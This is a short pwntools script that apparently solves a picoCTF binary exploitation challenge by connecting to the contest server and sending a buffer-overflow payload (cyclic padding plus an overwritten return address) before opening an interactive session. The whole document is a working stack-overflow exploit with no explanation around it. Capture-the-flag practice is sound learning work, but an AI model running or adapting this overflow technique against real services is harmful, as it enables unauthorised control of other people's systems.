from pwn import *
file = './vuln'
#p = process(file)
p = connect('saturn.picoctf.net', 63962)

payload = cyclic(cyclic_find('laaa')) + p64(0x080491fb)
p.sendlineafter(':', payload)

p.interactive()
